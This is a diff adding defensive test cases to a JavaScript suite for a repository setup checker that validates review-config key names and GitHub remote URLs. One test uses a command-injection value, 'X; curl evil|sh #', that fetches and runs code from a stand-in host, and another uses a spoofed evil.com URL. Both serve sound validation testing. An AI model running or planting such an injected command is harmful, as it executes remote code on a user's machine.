@@ -136,6 +136,10 @@ test("secrets: names only; the reviewer and evals are checked against them", () 
   const unused = checkSetup(world({ files: { ".github/review.json": JSON.stringify({ ...REVIEW_ON, disabled: "x" }) } }));
   assert.equal(byId(unused, "review-config")?.status, "warn", "a key that no-key mode ignores");
 
+  const injected = checkSetup(world({ gh: { [listCmd]: ok("") }, files: { ".github/review.json": JSON.stringify({ tiers: { standard: { apiKeyEnv: "X; curl evil|sh #" } } }) } }));
+  assert.equal(byId(injected, "review-config")?.status, "fail");
+  assert.doesNotMatch(renderReport(injected), /curl evil/, "an invalid key name never reaches a command or the report");
+
   const noAccess = checkSetup(world({ gh: { [listCmd]: { code: 1, stdout: "", stderr: "HTTP 403" } } }));
   assert.equal(byId(noAccess, "secrets")?.status, "skip");
   assert.equal(byId(noAccess, "review-config"), undefined, "no guessing without the list");
@@ -172,6 +176,9 @@ test("parsers: remotes, template sources, answers, versions, ruleset checks", ()
   assert.equal(parseGitHubRemote("https://github.com/maria/shop.git"), "maria/shop");
   assert.equal(parseGitHubRemote("git@github.com:maria/my.shop.git\n"), "maria/my.shop");
   assert.equal(parseGitHubRemote("https://gitlab.com/maria/shop.git"), null);
+  assert.equal(parseGitHubRemote("https://evil.com/x?github.com/a/b"), null, "only GitHub.com URLs");
+  assert.equal(parseGitHubRemote("git@github.com:a/..git"), null);
+  assert.equal(parseGitHubRemote("https://x-access-token@github.com/maria/shop"), "maria/shop");
   assert.equal(parseTemplateSource("gh:lexsimoes/ai-dev-template"), "lexsimoes/ai-dev-template");
   assert.equal(parseTemplateSource("/tmp/local/template"), null);
   assert.deepEqual(parseAnswers("# comment\n_commit: 'v0.1.0'\n_src_path: gh:a/b\n"), { _commit: "v0.1.0", _src_path: "gh:a/b" });
